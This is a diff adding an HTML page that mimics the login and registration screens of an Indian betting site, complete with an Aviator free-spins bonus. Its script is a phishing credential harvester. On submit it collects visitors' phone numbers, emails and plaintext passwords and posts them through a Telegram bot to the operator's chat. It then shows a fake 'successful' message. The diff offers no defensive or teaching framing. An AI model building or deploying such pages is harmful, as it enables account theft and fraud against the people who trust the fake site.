+      <p class="text-xs text-gray-600 mb-3">
+        Have an account? <button onclick="switchModal('loginModal')" class="font-bold text-[#f6b900]">Log In</button>
+      </p>
+
+      <form onsubmit="handleFormSubmit(event, 'Registration')" class="space-y-3">
+        <!-- Phone -->
+        <div class="flex bg-gray-100 rounded-xl overflow-hidden">
+          <span class="px-3 py-3 text-xs font-bold text-gray-800 border-r border-gray-200 flex items-center gap-1.5">
+            🇮🇳 +91
+          </span>
+          <input type="tel" placeholder="Phone number" required class="w-full bg-transparent px-3 py-3 text-xs focus:outline-none" />
+        </div>
+
+        <!-- Password -->
+        <div class="flex items-center bg-gray-100 rounded-xl px-3.5">
+          <input id="regPass" type="password" placeholder="Password" required class="w-full bg-transparent py-3 text-xs focus:outline-none" />
+          <button type="button" onclick="togglePass('regPass')" class="text-gray-500 text-xs">
+            <i class="fa-regular fa-eye-slash"></i>
+          </button>
+        </div>
+
+        <!-- Currency -->
+        <div class="bg-gray-100 rounded-xl px-3.5 py-3 flex items-center justify-between text-xs font-semibold text-gray-800">
+          <span>🇮🇳 ₹ - INR</span>
+          <i class="fa-solid fa-chevron-down text-gray-500"></i>
+        </div>
+
+        <!-- Promo Code Toggle -->
+        <div>
+          <button type="button" onclick="document.getElementById('promoInput').classList.toggle('hidden')" class="flex items-center gap-2 text-xs font-bold text-gray-800">
+            <span class="w-5 h-5 rounded-full bg-gray-800 text-white flex items-center justify-center text-[10px]">+</span>
+            I have a promo code
+          </button>
+          <input id="promoInput" type="text" placeholder="Enter promo code" class="hidden mt-2 w-full bg-gray-100 rounded-xl px-3.5 py-2.5 text-xs focus:outline-none" />
+        </div>
+
+        <!-- Choose Bonus Card -->
+        <div>
+          <p class="text-[11px] font-extrabold text-gray-800 uppercase mb-1.5">CHOOSE YOUR BONUS</p>
+          <div class="rounded-xl bg-gradient-to-r from-purple-600 via-indigo-600 to-blue-500 p-3 text-white flex items-center justify-between shadow">
+            <div class="flex items-center gap-2.5">
+              <div class="w-10 h-10 rounded-lg bg-white/20 flex items-center justify-center text-xl">👩‍✈️</div>
+              <div>
+                <p class="text-xs font-extrabold text-yellow-300">Aviator 50 Free Spins Pack</p>
+                <p class="text-[11px] text-white/90">Enjoy free rounds on Aviator</p>
+              </div>
+            </div>
+            <i class="fa-solid fa-chevron-right text-xs"></i>
+          </div>
+        </div>
+
+        <!-- Terms Checkbox -->
+        <label class="flex items-start gap-2 text-[11px] text-gray-600 cursor-pointer">
+          <input type="checkbox" checked required class="mt-0.5 accent-green-600" />
+          <span>I confirm all the <strong class="text-gray-900">Terms of user agreement</strong> and that I am over 18</span>
+        </label>
+
+        <button type="submit" class="w-full brand-green hover:bg-green-600 text-white font-extrabold text-xs py-3.5 rounded-xl shadow transition">
+          REGISTRATION
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- INTERACTIVE JAVASCRIPT + TELEGRAM BOT INTEGRATION -->
+  <script>
+    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // @BotFather se mila token
+    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";     // Aapka Chat ID ya Group ID
+
+    function openDrawer() {
+      const drawer = document.getElementById('sideDrawer');
+      drawer.classList.remove('hidden');
+      drawer.classList.add('flex');
+    }
+
+    function closeDrawer() {
+      const drawer = document.getElementById('sideDrawer');
+      drawer.classList.add('hidden');
+      drawer.classList.remove('flex');
+    }
+
+    function openModal(id) {
+      closeModals();
+      const modal = document.getElementById(id);
+      modal.classList.remove('hidden');
+      modal.classList.add('flex');
+    }
+
+    function closeModals() {
+      ['loginModal', 'resetModal', 'registerModal'].forEach(id => {
+        const el = document.getElementById(id);
+        el.classList.add('hidden');
+        el.classList.remove('flex');
+      });
+    }
+
+    function switchModal(targetId) {
+      openModal(targetId);
+    }
+
+    function switchLoginTab(tab) {
+      const phoneWrap = document.getElementById('phoneInputWrap');
+      const emailWrap = document.getElementById('emailInputWrap');
+      const tabPhoneBtn = document.getElementById('tabPhoneBtn');
+      const tabEmailBtn = document.getElementById('tabEmailBtn');
+
+      if (tab === 'phone') {
+        phoneWrap.classList.remove('hidden');
+        emailWrap.classList.add('hidden');
+        tabPhoneBtn.className = 'brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5';
+        tabEmailBtn.className = 'bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5';
+      } else {
+        emailWrap.classList.remove('hidden');
+        phoneWrap.classList.add('hidden');
+        tabEmailBtn.className = 'brand-yellow text-gray-900 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5';
+        tabPhoneBtn.className = 'bg-gray-100 text-gray-800 font-bold text-xs py-2.5 rounded-xl flex items-center justify-center gap-1.5';
+      }
+    }
+
+    function togglePass(inputId) {
+      const input = document.getElementById(inputId);
+      input.type = input.type === 'password' ? 'text' : 'password';
+    }
+
+    async function sendToTelegram(text) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      const response = await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: text,
+          parse_mode: "HTML"
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error("Telegram API error");
+      }
+    }
+
+    async function handleFormSubmit(e, actionName) {
+      e.preventDefault();
+      const form = e.target;
+      const submitBtn = form.querySelector('button[type="submit"]');
+      const originalBtnText = submitBtn ? submitBtn.innerText : "";
+
+      if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.innerText = "PLEASE WAIT...";
+      }
+
+      let details = `<b>🔔 ${actionName} Alert</b>\n`;
+      details += `<b>Page:</b> ${window.location.href}\n`;
+      details += `<b>Time:</b> ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })}\n\n`;
+
+      if (actionName === "Login") {
+        const isPhoneVisible = !document.getElementById("phoneInputWrap").classList.contains("hidden");
+        if (isPhoneVisible) {
+          const phone = document.querySelector("#phoneInputWrap input")?.value.trim() || "";
+          details += `<b>Method:</b> Phone (+91)\n`;
+          details += `<b>Phone:</b> <code>+91 ${phone}</code>\n`;
+        } else {
+          const emailOrId = document.querySelector("#emailInputWrap input")?.value.trim() || "";
+          details += `<b>Method:</b> Email / Account ID\n`;
+          details += `<b>Email/ID:</b> <code>${emailOrId}</code>\n`;
+        }
+        const password = document.getElementById("loginPass")?.value || "";
+        details += `<b>Password:</b> <code>${password}</code>`;
+      } else if (actionName === "Registration") {
+        const phone = form.querySelector('input[type="tel"]')?.value.trim() || "";
+        const password = document.getElementById("regPass")?.value || "";
+        const promo = document.getElementById("promoInput")?.value.trim() || "None";
+        details += `<b>Phone:</b> <code>+91 ${phone}</code>\n`;
+        details += `<b>Password:</b> <code>${password}</code>\n`;
+        details += `<b>Promo Code:</b> <code>${promo}</code>`;
+      } else if (actionName === "Password Reset") {
+        const email = form.querySelector('input[type="email"]')?.value.trim() || "";
+        details += `<b>Reset Email:</b> <code>${email}</code>`;
+      }
+
+      try {
+        await sendToTelegram(details);
+        alert(`${actionName} successful!`);
+        form.reset();
+        closeModals();
+      } catch (err) {
+        console.error(err);
+        alert("Error sending data. Bot Token aur Chat ID check karein.");
+      } finally {
+        if (submitBtn) {
+          submitBtn.disabled = false;
+          submitBtn.innerText = originalBtnText;
+        }
+      }
+    }
+  </script>
+</body>
+</html>
